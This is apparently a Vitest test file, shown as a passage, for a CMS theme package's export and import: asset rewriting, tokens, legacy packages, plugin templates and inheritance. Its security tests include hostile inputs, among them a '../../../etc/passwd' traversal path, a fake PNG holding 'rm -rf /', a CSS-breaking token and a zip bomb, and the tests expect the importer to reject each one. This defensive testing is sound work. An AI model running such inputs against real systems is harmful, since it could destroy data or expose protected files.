/**
 * `.xttheme` export / import.
 *
 * The thing worth testing is the ROUND TRIP: a package built on one install has to
 * produce the same look on another, and the only part of a layout document that does
 * not travel by itself is an image. An asset reference is a path into `uploads/`, which
 * means nothing on the machine that receives it — so export copies the bytes in and
 * rewrites the reference, and import unpacks them and rewrites it again. Assert both
 * halves, or a theme silently arrives with broken images.
 *
 * The two services are mocked because none of the above is about the database, and
 * `UPLOAD_DIR` is repointed at a temp directory BEFORE the storage provider is imported
 * (it resolves its base once, at module load).
 */
import fsSync from "node:fs";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import AdmZip from "adm-zip";
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  DEFAULT_LAYOUTS,
  DEFAULT_SITE_FRAME,
  siteFrameSchema,
  type SiteFrame,
  THEME_ASSET_LIMITS,
  deregisterTemplatesFor,
  registerTemplate,
  THEME_PATHS,
  THEME_PATHS_LEGACY,
  type BlockNode,
  type LayoutDocument,
  type CoreTemplateKey,
  type TemplateKey,
} from "@xentium/contracts";

const UPLOAD_DIR = fsSync.mkdtempSync(path.join(os.tmpdir(), "xt-theme-"));
process.env.UPLOAD_DIR = UPLOAD_DIR;
afterAll(async () => { await fs.rm(UPLOAD_DIR, { recursive: true, force: true }); });

// ── Stand-ins for the two stores ─────────────────────────────────────────────

type Scoped = Record<string, Record<string, string>>;

const published = { templates: {} as Record<TemplateKey, LayoutDocument>, variants: {} };
/** Which templates the admin has moved away from their baseline. */
const customised = new Set<TemplateKey>();

/*
 * Views over the per-theme model. A theme's package lives in its library row and is
 * what renders for every template the admin has not changed; there is no copy of it
 * anywhere else. These read that, so a test can still ask "what does the site render
 * for Home now" or "what is the theme's baseline" without knowing where it is stored.
 */
const activePayload = () => {
  const id = appearance.installed?.id;
  return id ? library.rows.get(String(id))?.payload : undefined;
};
const lastPayload = () => (library.last ? library.rows.get(library.last)?.payload : undefined);
/** What the ACTIVE theme renders per template (not the ones the admin kept). */
const renders = (template: string): LayoutDocument | undefined =>
  customised.has(template as TemplateKey) ? undefined : activePayload()?.documents?.[template];
const liveView = (suffix: string) => ({
  get: (k: string) => renders(k.slice(0, k.length - suffix.length)),
  has: (k: string) => !!renders(k.slice(0, k.length - suffix.length)),
  keys: () => Object.keys(activePayload()?.documents ?? {}).filter((t) => renders(t)).map((t) => `${t}${suffix}`),
  get size() { return this.keys().length; },
});
const savedDrafts = liveView("|");
const livePublished = liveView("");
/** What the most recently installed theme SHIPS, per template — its baseline. */
const themeLayer = {
  get: (k: string) => lastPayload()?.documents?.[k],
  has: (k: string) => !!lastPayload()?.documents?.[k],
  keys: () => Object.keys(lastPayload()?.documents ?? {}),
};
/** The site frame: published (for export), shipped, and what the active theme renders. */
const frames = {
  published: DEFAULT_SITE_FRAME as SiteFrame,
  customised: false,
  get theme(): SiteFrame | null { return lastPayload()?.frame ?? null; },
  get applied(): SiteFrame | null {
    const p = activePayload();
    if (!p || frames.customised) return null;
    return p.frame ?? DEFAULT_SITE_FRAME;
  },
};

const appearance = {
  effective: {} as Scoped,
  customCss: "",
  installed: null as Record<string, unknown> | null,
  /** The tokens / stylesheet the last installed theme SHIPS — its package. */
  get savedThemeTokens(): unknown { return lastPayload()?.tokens ?? null; },
  get savedThemeCustomCss(): string | null { return lastPayload()?.customCss ?? null; },
  /** The admin's own stylesheet is never written by an install. */
  savedCustomCss: null as unknown,
  savedInstalled: null as Record<string, unknown> | null,
  themeCustomCss: "",
  /** Applying a theme is LIVE, so it has to tell open clients. */
  styleVersionBumps: 0,
  /** Which themes' stylesheets were rebuilt. */
  recompiled: [] as string[],
};

vi.mock("../layouts/layout.service.js", () => ({
  // The layout half of the per-theme caches.
  bustThemeLayouts: () => {},
  layoutService: {
    // An export reads the PUBLISHED documents of the theme being exported.
    getPublishedFor:   async () => published,
    getPublishedFrame: async () => frames.published,
    getThemeLayer:     async (key: string) => library.rows.get(key)?.payload?.documents ?? {},
    // An UPDATE releases the templates still exactly as the old version shipped them,
    // and reports the ones the admin changed — decided before the package is replaced.
    releaseUntouched: async () => {
      rollbackProbe.releasedBeforeReplace = library.rows.get(rollbackProbe.updating)?.payload;
      return { kept: [...customised], frameKept: frames.customised };
    },
    snapshotTheme: async (key: string) => {
      rollbackProbe.snapshotOf = key;
      return [{ templateKey: "home", variant: "", scope: "published", document: { probe: "before" } }];
    },
    restoreTheme: async (rows: { templateKey: string }[], _user: string, key: string) => {
      rollbackProbe.restoreCalled = true;
      rollbackProbe.restoredKey = key;
      rollbackProbe.restored = rows.map((r) => r.templateKey);
    },
    forgetTheme: async (key: string) => { forgotten.push(`layouts:${key}`); },
  },
}));

/** What uninstall cleared, in order. */
const forgotten: string[] = [];

vi.mock("../appearance/appearance.service.js", () => ({
  // Per-theme stylesheets are memoised by id; install and uninstall clear them, so
  // the mock has to offer the same door or those paths throw here and only here.
  bustThemeCss: () => {},
  appearanceService: {
    getEffectiveTokens: async () => appearance.effective,
    getCustomCss:       async () => appearance.customCss,
    getThemeCustomCss:  async () => appearance.themeCustomCss,
    getInstalledTheme:  async () => appearance.installed,
    // What the site now WEARS — `null` = Core.
    setInstalledTheme:  async (m: Record<string, unknown> | null) => {
      appearance.savedInstalled = m;
      appearance.installed = m;
    },
    recompileCustomCss: async (key: string) => { appearance.recompiled.push(key); return ""; },
    bumpStyleVersion:   async () => { appearance.styleVersionBumps = (appearance.styleVersionBumps ?? 0) + 1; },
    saveThemeRollback:  async (v: unknown) => { rollbackProbe.saved = v; },
    getThemeRollback:   async () => rollbackProbe.saved ?? null,
    clearThemeRollback: async () => { rollbackProbe.saved = null; rollbackProbe.cleared = true; },
    forgetTheme:        async (key: string) => { forgotten.push(`appearance:${key}`); },
  },
}));

vi.mock("./themeKey.js", async (importOriginal) => ({
  ...(await importOriginal<typeof import("./themeKey.js")>()),
  activeThemeKey: async () => (appearance.installed?.id ? String(appearance.installed.id) : ""),
}));

/** What the import/discard pair did with the undo point. */
const rollbackProbe: Record<string, any> = {};


/** An in-memory stand-in for `xcf_themes`. Only the operations the service uses. */
const library = { rows: new Map<string, any>(), last: null as string | null };

vi.mock("../../infrastructure/db.js", () => ({
  prisma: {
    theme: {
      findUnique: async ({ where }: any) => library.rows.get(where.id) ?? null,
      findMany:   async () => [...library.rows.values()],
      updateMany: async ({ where, data }: any) => {
        for (const row of library.rows.values()) {
          if (where.active === undefined || row.active === where.active) Object.assign(row, data);
        }
        return { count: 0 };
      },
      upsert: async ({ where, update, create }: any) => {
        library.last = where.id;
        const existing = library.rows.get(where.id);
        const row = existing
          ? Object.assign(existing, update)
          : { installedAt: new Date(), activatedAt: null, ...create };
        library.rows.set(where.id, row);
        return row;
      },
      update: async ({ where, data }: any) => {
        const row = library.rows.get(where.id);
        Object.assign(row, data);
        return row;
      },
      delete: async ({ where }: any) => { library.rows.delete(where.id); return {}; },
    },
    // The service's transaction is a list of already-issued promises.
    $transaction: async (ops: Promise<unknown>[]) => Promise.all(ops),
  },
}));

const { themeService } = await import("./theme.service.js");

/**
 * Install a package AND put it on the site — what one import did before installing
 * and switching became two decisions. Most tests here are about what APPLYING a theme
 * does, so they go through this; the ones about installing without switching call
 * `importTheme` directly.
 */
async function putOn(buf: Buffer, userId: string) {
  const report = await themeService.importTheme(buf, userId);
  if (report.activated) return report;
  const r = await themeService.activateTheme(report.manifest.id, userId);
  const payload = library.rows.get(report.manifest.id)!.payload;
  return {
    ...report,
    activated: true,
    templates: r.applied, kept: r.kept, replaced: r.replaced,
    tokensApplied: !!payload.tokens, customCssApplied: !!payload.customCss,
  };
}

// ── Fixtures ─────────────────────────────────────────────────────────────────

/** A real 1×1 PNG: the point is that `file-type` sniffs it, so it must be genuine. */
const PNG = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
  "base64",
);

const META = { id: "round-trip", name: "Round trip", version: "1.0.0", vendor: "Tester" };

/** A home layout whose hero points at an uploaded image. */
function homeWithHero(image: string): LayoutDocument {
  const doc = structuredClone(DEFAULT_LAYOUTS.home) as LayoutDocument;
  const find = (nodes: BlockNode[]): BlockNode | undefined => {
    for (const n of nodes) {
      if (n.type === "guestHero") return n;
      const hit = n.children && find(n.children);
      if (hit) return hit;
    }
    return undefined;
  };
  const hero = find(Object.values(doc.regions).flat());
  if (!hero) throw new Error("the shipped home default no longer has a guestHero");
  hero.props = { ...hero.props, backgroundImage: image };
  return doc;
}

beforeEach(async () => {
  for (const key of Object.keys(DEFAULT_LAYOUTS) as CoreTemplateKey[]) {
    published.templates[key] = structuredClone(DEFAULT_LAYOUTS[key]) as LayoutDocument;
  }
  customised.clear();
  library.rows.clear();
  library.last = null;
  for (const k of Object.keys(rollbackProbe)) delete rollbackProbe[k];
  frames.published = DEFAULT_SITE_FRAME;
  frames.customised = false;
  appearance.effective = { global: {} };
  appearance.customCss = "";
  appearance.installed = null;
  appearance.savedCustomCss = null;
  appearance.savedInstalled = null;
  appearance.themeCustomCss = "";
  appearance.recompiled = [];
  await fs.rm(path.join(UPLOAD_DIR, "themes"), { recursive: true, force: true });
});

const write = async (rel: string, data: Buffer) => {
  await fs.mkdir(path.join(UPLOAD_DIR, path.dirname(rel)), { recursive: true });
  await fs.writeFile(path.join(UPLOAD_DIR, rel), data);
};

const heroImageOf = (doc: LayoutDocument): string | undefined => {
  const walk = (nodes: BlockNode[]): string | undefined => {
    for (const n of nodes) {
      if (n.type === "guestHero") return (n.props as { backgroundImage?: string }).backgroundImage;
      const hit = n.children && walk(n.children);
      if (hit !== undefined) return hit;
    }
    return undefined;
  };
  return walk(Object.values(doc.regions).flat());
};

// ── Export ───────────────────────────────────────────────────────────────────

describe("export", () => {
  it("copies a referenced image into the package and rewrites the reference", async () => {
    await write("pages/hero.png", PNG);
    published.templates.home = homeWithHero("pages/hero.png");

    const zip = new AdmZip(await themeService.exportTheme(META));
    expect(zip.getEntry(`${THEME_PATHS.assets}hero.png`)?.getData()).toEqual(PNG);

    const doc = JSON.parse(zip.getEntry(`${THEME_PATHS.layouts}home.json`)!.getData().toString());
    // The reference now names the package, not this machine's uploads directory.
    expect(heroImageOf(doc)).toBe("assets/hero.png");
  });

  it("leaves an absolute URL alone — a theme may point at a CDN", async () => {
    published.templates.home = homeWithHero("https://cdn.example.com/a.png");
    const zip = new AdmZip(await themeService.exportTheme(META));
    const doc = JSON.parse(zip.getEntry(`${THEME_PATHS.layouts}home.json`)!.getData().toString());
    expect(heroImageOf(doc)).toBe("https://cdn.example.com/a.png");
    expect(zip.getEntries().filter((e) => e.entryName.startsWith("assets/"))).toHaveLength(0);
  });

  it("keeps a reference whose file is gone, rather than failing the export", async () => {
    published.templates.home = homeWithHero("pages/missing.png");
    const zip = new AdmZip(await themeService.exportTheme(META));
    const doc = JSON.parse(zip.getEntry(`${THEME_PATHS.layouts}home.json`)!.getData().toString());
    expect(heroImageOf(doc)).toBe("pages/missing.png");
  });

  it("refuses to read outside the uploads directory", async () => {
    published.templates.home = homeWithHero("../../../etc/passwd");
    const zip = new AdmZip(await themeService.exportTheme(META));
    expect(zip.getEntries().filter((e) => e.entryName.startsWith("assets/"))).toHaveLength(0);
  });

  it("carries the scoped tokens the CSS files cannot express", async () => {
    appearance.effective = {
      global: { "--c-bg": "#fff" }, "chrome.header": { "--c-bg": "#111" },
    };
    const zip = new AdmZip(await themeService.exportTheme(META));

    const tokens = JSON.parse(zip.getEntry(THEME_PATHS.tokens)!.getData().toString());
    expect(tokens["chrome.header"]["--c-bg"]).toBe("#111");
    // `:root` CSS can only hold the global scope; it stays for `.xtstyle` readers.
    const css = zip.getEntry(THEME_PATHS.css)!.getData().toString();
    expect(css).toContain("--c-bg: #fff;");
    expect(css).not.toContain("#111");
  });

  it("carries custom CSS, and omits the file when there is none", async () => {
    const zip1 = new AdmZip(await themeService.exportTheme(META));
    expect(zip1.getEntry(THEME_PATHS.custom)).toBeNull();

    appearance.customCss = ".x { color: red; }";
    const zip2 = new AdmZip(await themeService.exportTheme(META));
    expect(zip2.getEntry(THEME_PATHS.custom)!.getData().toString()).toBe(".x { color: red; }");
  });

  it("writes ONE stylesheet and one token file — not the pre-collapse pairs", async () => {
    appearance.customCss = ".x { color: red; }";
    const names = new AdmZip(await themeService.exportTheme(META)).getEntries().map((e) => e.entryName);
    expect(names).toContain(THEME_PATHS.css);
    expect(names).toContain(THEME_PATHS.custom);
    for (const legacy of Object.values(THEME_PATHS_LEGACY)) expect(names).not.toContain(legacy);
  });

  /**
   * The preview image. `screenshot` sat in the manifest schema unproduced for the
   * whole life of the format; a marketplace listing with no picture is a theme
   * nobody clicks, so the export is now the thing that fills it in.
   */
  describe("preview image", () => {
    it("packs it as an asset and names it in the manifest", async () => {
      const zip = new AdmZip(await themeService.exportTheme(META, { screenshot: PNG }));
      expect(zip.getEntry(`${THEME_PATHS.assets}screenshot.png`)?.getData()).toEqual(PNG);
      const manifest = JSON.parse(zip.getEntry(THEME_PATHS.manifest)!.getData().toString());
      expect(manifest.screenshot).toBe("assets/screenshot.png");
    });

    it("names no screenshot when none was given", async () => {
      const zip = new AdmZip(await themeService.exportTheme(META));
      const manifest = JSON.parse(zip.getEntry(THEME_PATHS.manifest)!.getData().toString());
      expect(manifest.screenshot).toBeUndefined();
    });

    /**
     * The collision is silent otherwise: `addFile` twice under one name leaves
     * whichever won, and the manifest would point at a page's hero image while the
     * document lost the file it referenced.
     */
    it("keeps its name when a page image is also called screenshot.png", async () => {
      await write("pages/screenshot.png", PNG);
      published.templates.home = homeWithHero("pages/screenshot.png");

      const zip = new AdmZip(await themeService.exportTheme(META, { screenshot: PNG }));
      const doc = JSON.parse(zip.getEntry(`${THEME_PATHS.layouts}home.json`)!.getData().toString());
      // The hero was renamed around the reserved name, and still resolves.
      expect(heroImageOf(doc)).toBe("assets/2-screenshot.png");
      expect(zip.getEntry(`${THEME_PATHS.assets}2-screenshot.png`)).not.toBeNull();

      const manifest = JSON.parse(zip.getEntry(THEME_PATHS.manifest)!.getData().toString());
      expect(manifest.screenshot).toBe("assets/screenshot.png");
    });

    /** Rendered by a marketplace that did not build the package, so it holds the
     *  same magic-byte rule an imported asset does — and SVG, the one image format
     *  that can carry script, is not on the list. */
    it("refuses anything that is not a real raster image", async () => {
      await expect(themeService.exportTheme(META, { screenshot: Buffer.from("<svg/>") }))
        .rejects.toThrow(/PNG, JPEG, WebP or AVIF/);
    });

    it("is packed even for a tokens-only palette, which carries no other assets", async () => {
      const zip = new AdmZip(await themeService.exportTheme(META, { tokensOnly: true, screenshot: PNG }));
      expect(zip.getEntry(`${THEME_PATHS.assets}screenshot.png`)).not.toBeNull();
      expect(zip.getEntry(`${THEME_PATHS.layouts}home.json`)).toBeNull();
    });
  });

  it("records the distribution metadata a listing needs", async () => {
    const zip = new AdmZip(await themeService.exportTheme({
      ...META, license: "MIT", homepage: "https://example.com", authorUrl: "https://example.com/me",
    }));
    const manifest = JSON.parse(zip.getEntry(THEME_PATHS.manifest)!.getData().toString());
    // packageVersion 2 = one look: a single `tokens.json` map and one stylesheet each.
    expect(manifest).toMatchObject({ license: "MIT", homepage: "https://example.com", packageVersion: 2 });
  });
});

// ── Import ───────────────────────────────────────────────────────────────────

/** Build a package by hand — the shape a third party would ship. */
function pack(files: Record<string, string | Buffer>, manifest?: Record<string, unknown>): Buffer {
  const zip = new AdmZip();
  zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({
    ...META, minXentiumVersion: "1.0", ...manifest,
  })));
  for (const [name, body] of Object.entries(files)) {
    zip.addFile(name, typeof body === "string" ? Buffer.from(body) : body);
  }
  return zip.toBuffer();
}

describe("import", () => {
  it("round-trips an image: unpacks it and repoints the document at it", async () => {
    await write("pages/hero.png", PNG);
    published.templates.home = homeWithHero("pages/hero.png");
    const exported = await themeService.exportTheme(META);

    const report = await putOn(exported, "user-1");
    expect(report.assetsImported).toBe(1);

    const stored = path.join(UPLOAD_DIR, "themes", META.id, "hero.png");
    expect(await fs.readFile(stored)).toEqual(PNG);

    const staged = savedDrafts.get("home|")!;
    // Not `assets/hero.png` any more, and not the exporting site's path either.
    expect(heroImageOf(staged)).toBe(`themes/${META.id}/hero.png`);
  });

  /**
   * The other half of the preview round trip. In a PACKAGE `screenshot` is
   * package-relative; in the INSTALLED record it has to be this install's upload
   * path, or the ACP renders a broken image — the same rewrite a document's image
   * reference gets, for the same reason.
   */
  describe("preview image", () => {
    it("repoints the stored manifest at where the image actually landed", async () => {
      const exported = await themeService.exportTheme(META, { screenshot: PNG });
      await putOn(exported, "user-1");

      expect(appearance.savedInstalled!.screenshot).toBe(`themes/${META.id}/screenshot.png`);
      expect(await fs.readFile(path.join(UPLOAD_DIR, "themes", META.id, "screenshot.png"))).toEqual(PNG);
    });

    /** A theme may be pointing at a CDN. Blanking a value the package did not
     *  carry a file for would break exactly that case. */
    it("leaves a screenshot the package does not carry untouched", async () => {
      const buf = pack(
        { [THEME_PATHS.css]: ":root { --c-bg: #fff; }" },
        { screenshot: "https://cdn.example.com/shot.png" },
      );
      await putOn(buf, "user-1");
      expect(appearance.savedInstalled!.screenshot).toBe("https://cdn.example.com/shot.png");
    });
  });

  it("prefers tokens.json over the :root stylesheet", async () => {
    const buf = pack({
      [THEME_PATHS.tokens]: JSON.stringify({ global: { "--c-bg": "#json" } }),
      [THEME_PATHS.css]: ":root { --c-bg: #css; }",
    });
    await putOn(buf, "user-1");
    expect(appearance.savedThemeTokens).toMatchObject({ global: { "--c-bg": "#json" } });
  });

  it("falls back to the stylesheet when there is no tokens.json", async () => {
    await putOn(pack({ [THEME_PATHS.css]: ":root { --c-bg: #css; }" }), "user-1");
    expect(appearance.savedThemeTokens).toMatchObject({ global: { "--c-bg": "#css" } });
  });

  it("rejects a token value that could close the CSS block early", async () => {
    const buf = pack({
      [THEME_PATHS.tokens]: JSON.stringify({ global: { "--x": "red } body { display:none" } }),
    });
    await expect(putOn(buf, "user-1")).rejects.toThrow(/tokens\.json is invalid/);
  });

  /**
   * A package built before a site had ONE look. Both halves of it — the paired
   * `tokens.json` and the paired stylesheets — still install, as the LIGHT half, and the
   * dark half is REPORTED rather than dropped in silence: "I exported a theme with a
   * dark mode and half of it vanished" deserves a sentence.
   */
  describe("a pre-collapse package", () => {
    it("takes the light half of a paired tokens.json and names the dark one", async () => {
      const buf = pack({
        [THEME_PATHS.tokens]: JSON.stringify({
          light: { global: { "--c-bg": "#light" } },
          dark:  { global: { "--c-bg": "#dark" } },
        }),
      });
      const report = await putOn(buf, "user-1");
      expect(appearance.savedThemeTokens).toMatchObject({ global: { "--c-bg": "#light" } });
      expect(report.ignoredFiles).toContain(`${THEME_PATHS.tokens} (dark)`);
    });

    it("says nothing about a paired tokens.json whose dark half is empty", async () => {
      const buf = pack({
        [THEME_PATHS.tokens]: JSON.stringify({ light: { global: { "--c-bg": "#light" } }, dark: {} }),
      });
      const report = await putOn(buf, "user-1");
      expect(report.ignoredFiles).toEqual([]);
    });

    it("reads styles/light.css and names styles/dark.css", async () => {
      const buf = pack({
        [THEME_PATHS_LEGACY.cssLight]: ":root { --c-bg: #light; }",
        [THEME_PATHS_LEGACY.cssDark]:  ":root { --c-bg: #dark; }",
      });
      const report = await putOn(buf, "user-1");
      expect(appearance.savedThemeTokens).toMatchObject({ global: { "--c-bg": "#light" } });
      expect(report.ignoredFiles).toContain(THEME_PATHS_LEGACY.cssDark);
    });

    it("reads custom-light.css and names custom-dark.css", async () => {
      const buf = pack({
        [THEME_PATHS_LEGACY.customLight]: ".a { color: red }",
        [THEME_PATHS_LEGACY.customDark]:  ".a { color: navy }",
      });
      const report = await putOn(buf, "user-1");
      expect(appearance.savedThemeCustomCss).toBe(".a { color: red }");
      expect(report.ignoredFiles).toContain(THEME_PATHS_LEGACY.customDark);
    });
  });

  it("stages custom CSS in the theme layer and says so", async () => {
    // This used to assert the opposite — that the package's stylesheet went LIVE, into
    // the admin's own keys. That was the bug: it overwrote whatever CSS the admin had
    // written, with no baseline and nothing to recover from. See the theme-custom-CSS
    // block at the bottom of this file for the rest of the behaviour.
    const report = await putOn(
      pack({ [THEME_PATHS.custom]: ".x { color: red; }" }), "user-1",
    );
    expect(report.customCssApplied).toBe(true);
    expect(appearance.savedThemeCustomCss).toBe(".x { color: red; }");
    expect(appearance.savedCustomCss).toBeNull();
  });

  it("rejects custom CSS that does not parse, before anything is written", async () => {
    const buf = pack({
      [THEME_PATHS.custom]: ".x { color: red;",
      [THEME_PATHS.tokens]: JSON.stringify({ global: { "--c-bg": "#fff" } }),
    });
    await expect(putOn(buf, "user-1")).rejects.toThrow(/syntax error/);
    expect(appearance.savedThemeTokens).toBeNull();
  });

  it("refuses an asset that is not an image or a font, whatever it is called", async () => {
    const buf = pack({ [`${THEME_PATHS.assets}evil.png`]: "#!/bin/sh\nrm -rf /\n" });
    await expect(putOn(buf, "user-1")).rejects.toThrow(/not an allowed image or font/);
  });

  it("cannot be made to write outside the uploads directory", async () => {
    // Two shapes of the same attack. `assets/../../escaped.png` never even reads as an
    // asset — adm-zip normalises it to `escaped.png`, which fails the `assets/` prefix —
    // and a legitimately nested name is flattened to its basename on the way in.
    const buf = pack({
      [`${THEME_PATHS.assets}../../escaped.png`]: PNG,
      [`${THEME_PATHS.assets}deep/dir/hero.png`]: PNG,
      // Assets alone are not a theme, so the package carries a token file too.
      [THEME_PATHS.tokens]: JSON.stringify({ light: { global: { "--c-bg": "#fff" } }, dark: {} }),
    });
    const report = await putOn(buf, "user-1");

    expect(report.assetsImported).toBe(1);
    expect(fsSync.existsSync(path.join(UPLOAD_DIR, "themes", META.id, "hero.png"))).toBe(true);
    expect(fsSync.existsSync(path.resolve(UPLOAD_DIR, "..", "..", "escaped.png"))).toBe(false);
    expect(fsSync.existsSync(path.join(UPLOAD_DIR, "themes", META.id, "deep"))).toBe(false);
  });

  it("refuses a package with more assets than the limit", async () => {
    const files: Record<string, Buffer> = {};
    for (let i = 0; i <= THEME_ASSET_LIMITS.maxFiles; i++) files[`${THEME_PATHS.assets}a${i}.png`] = PNG;
    await expect(putOn(pack(files), "user-1")).rejects.toThrow(/the limit is/);
  });

  it("refuses two assets that would be stored under one name", async () => {
    const buf = pack({
      [`${THEME_PATHS.assets}hero.png`]: PNG,
      [`${THEME_PATHS.assets}sub/hero.png`]: PNG,
    });
    await expect(putOn(buf, "user-1")).rejects.toThrow(/would be stored as/);
  });

  it("writes no asset when a layout in the same package is invalid", async () => {
    const broken = { ...structuredClone(DEFAULT_LAYOUTS.home), regions: { nope: [] } };
    const buf = pack({
      [`${THEME_PATHS.assets}hero.png`]: PNG,
      [`${THEME_PATHS.layouts}home.json`]: JSON.stringify(broken),
    });
    await expect(putOn(buf, "user-1")).rejects.toThrow(/home\.json/);
    expect(savedDrafts.size).toBe(0);
    expect(fsSync.existsSync(path.join(UPLOAD_DIR, "themes", META.id))).toBe(false);
  });

  it("refuses an entry whose declared size is implausible, without decompressing it", async () => {
    // A 20 MB run of one byte compresses to a few KB — the classic bomb shape.
    const buf = pack({ [`${THEME_PATHS.layouts}home.json`]: Buffer.alloc(20_000_000, 0x20) });
    await expect(putOn(buf, "user-1")).rejects.toThrow(/implausibly large/);
  });
});

// ── Variants ─────────────────────────────────────────────────────────────────
// A style variant is half document (which look a block picked) and half tokens (what
// that look IS). Both halves have to travel, or an imported theme applies looks the
// receiving site has no definition for.

/**
 * A theme exported from a site running a plugin carries that plugin's templates. The
 * question this covers is what happens on a site WITHOUT the plugin — the answer has
 * to be "the rest of the theme applies, and the admin is told what did not", because
 * refusing the whole package would make one plugin a hard dependency of every theme
 * ever exported alongside it.
 */
describe("plugin templates in a package", () => {
  const KEY = "testplug.index";
  const PLUGIN = "xentium-testplug";
  const DOC = {
    templateKey: KEY,
    schemaVersion: 1,
    regions: { main: [{ id: "p1", type: "heading", props: { text: "Plugin page" } }] },
  };

  afterEach(() => { deregisterTemplatesFor(PLUGIN); });

  it("exports a registered plugin template alongside core's", async () => {
    registerTemplate({
      key: KEY, label: "Test index", pluginId: PLUGIN,
      regions: ["main"], defaultDocument: { templateKey: KEY, regions: {} },
    });
    published.templates[KEY] = DOC as LayoutDocument;

    const zip = new AdmZip(await themeService.exportTheme(META));
    expect(zip.getEntry(`${THEME_PATHS.layouts}${KEY}.json`)).toBeTruthy();
    expect(zip.getEntry(`${THEME_PATHS.layouts}home.json`)).toBeTruthy();
  });

  it("imports it when the plugin is enabled", async () => {
    registerTemplate({
      key: KEY, label: "Test index", pluginId: PLUGIN,
      regions: ["main"], defaultDocument: { templateKey: KEY, regions: {} },
    });
    const report = await putOn(
      pack({ [`${THEME_PATHS.layouts}${KEY}.json`]: JSON.stringify(DOC) }), "user-1",
    );
    expect(report.templates).toContain(KEY);
    expect(report.unknownTemplates).toEqual([]);
    expect(savedDrafts.get(`${KEY}|`)).toBeTruthy();
  });

  it("SKIPS it when the plugin is not, applies the rest, and reports it", async () => {
    const report = await putOn(pack({
      [`${THEME_PATHS.layouts}${KEY}.json`]: JSON.stringify(DOC),
      [`${THEME_PATHS.layouts}home.json`]:   JSON.stringify(DEFAULT_LAYOUTS.home),
    }), "user-1");

    expect(report.unknownTemplates).toEqual([KEY]);
    expect(report.templates).toContain("home");        // the rest of the theme still lands
    expect(savedDrafts.get(`${KEY}|`)).toBeUndefined(); // nothing stored for the unknown one
    expect(themeLayer.has(KEY)).toBe(false);            // and no baseline either
  });
});

describe("style variants", () => {
  it("carries a block's variant and the variant's tokens through a round trip", async () => {
    const home = structuredClone(DEFAULT_LAYOUTS.home) as LayoutDocument;
    home.regions.main![0]!.variant = "accent";
    published.templates.home = home;
    appearance.effective = { "variant.accent": { "--surface-bg": "#ff0000" } };

    const report = await putOn(await themeService.exportTheme(META), "user-1");

    expect(report.tokensApplied).toBe(true);
    expect(savedDrafts.get("home|")!.regions.main![0]!.variant).toBe("accent");
    expect(appearance.savedThemeTokens).toMatchObject({
      "variant.accent": { "--surface-bg": "#ff0000" },
    });
  });

  it("refuses a document naming a variant this build does not have", async () => {
    const broken = structuredClone(DEFAULT_LAYOUTS.home) as LayoutDocument;
    (broken.regions.main![0] as { variant?: string }).variant = "neon";
    const buf = pack({ [`${THEME_PATHS.layouts}home.json`]: JSON.stringify(broken) });
    await expect(putOn(buf, "user-1")).rejects.toThrow(/home\.json/);
    expect(savedDrafts.size).toBe(0);
  });
});

// ── Inheritance ──────────────────────────────────────────────────────────────
// The failure this exists to prevent: an admin buys a theme, customises a page, takes
// the 1.1 update, and loses the customisation. XenForo and WoltLab both make you choose
// between the update and your work; here the theme is a LAYER underneath.

describe("theme inheritance", () => {
  const pkg = (extra?: Record<string, unknown>) => {
    const zip = new AdmZip();
    zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({ ...META, minXentiumVersion: "1.0", ...extra })));
    for (const key of ["home", "members"] as CoreTemplateKey[]) {
      zip.addFile(`${THEME_PATHS.layouts}${key}.json`,
        Buffer.from(JSON.stringify(DEFAULT_LAYOUTS[key])));
    }
    zip.addFile(THEME_PATHS.tokens, Buffer.from(JSON.stringify({
      light: { global: { "--c-accent": "#111111", "--c-bg": "#eeeeee" } }, dark: {},
    })));
    return zip.toBuffer();
  };

  it("records what it ships as the baseline, for every template", async () => {
    const report = await putOn(pkg(), "user-1");
    expect([...themeLayer.keys()].sort()).toEqual(["home", "members"]);
    expect(report.templates.sort()).toEqual(["home", "members"]);
    expect(report.kept).toEqual([]);
  });

  it("KEEPS a template the admin customised, and applies the rest", async () => {
    await putOn(pkg(), "user-1");   // 1.0
    customised.add("home");                            // the admin edited Home

    const report = await putOn(pkg({ version: "1.1.0" }), "user-1");

    expect(report.kept).toEqual(["home"]);
    expect(report.templates).toEqual(["members"]);
    // The customised template's document was NOT touched…
    expect(savedDrafts.has("home|")).toBe(false);
    // …but its baseline moved, so the next update compares against 1.1 and
    // "Revert to theme" offers the new version.
    expect(themeLayer.get("home")).toBeTruthy();
    expect(savedDrafts.has("members|")).toBe(true);
  });

  it("names the version it replaced, so an update can be described", async () => {
    appearance.installed = { id: META.id, name: META.name, version: "1.0.0" };
    const report = await putOn(pkg({ version: "2.0.0" }), "user-1");
    expect(report.replaced).toEqual({ id: META.id, name: META.name, version: "1.0.0" });
    expect(appearance.savedInstalled).toMatchObject({ version: "2.0.0" });
  });

  it("puts tokens in the THEME layer, never the admin's draft", async () => {
    // This is token-level inheritance: the admin's own overrides live in a different
    // layer, so they survive an update per TOKEN rather than per file.
    await putOn(pkg(), "user-1");
    expect(appearance.savedThemeTokens).toMatchObject({
      global: { "--c-accent": "#111111" },
    });
  });

  it("still reports nothing kept on a first import of a stock site", async () => {
    const report = await putOn(pkg(), "user-1");
    expect(report.kept).toEqual([]);
    expect(report.replaced).toBeNull();
  });
});

// ── Edge art ─────────────────────────────────────────────────────────────────

describe("edge art", () => {
  it("packs an edge image with the theme and repoints it on import", async () => {
    await write("layouts/drips.png", PNG);
    const header = structuredClone(DEFAULT_LAYOUTS["chrome.header"]) as LayoutDocument;
    header.regions.header![1]!.edges = {
      bottom: { shape: "image", image: "layouts/drips.png", direction: "out", colors: ["#000"],
        fit: "repeat", height: 40, mirror: false, season: { from: "10-01", to: "11-01" } },
    };
    published.templates["chrome.header"] = header;

    const exported = await themeService.exportTheme(META);
    const zip = new AdmZip(exported);
    expect(zip.getEntry(`${THEME_PATHS.assets}drips.png`)?.getData()).toEqual(PNG);
    const packed = JSON.parse(zip.getEntry(`${THEME_PATHS.layouts}chrome.header.json`)!.getData().toString());
    expect(packed.regions.header[1].edges.bottom.image).toBe("assets/drips.png");

    await putOn(exported, "user-1");
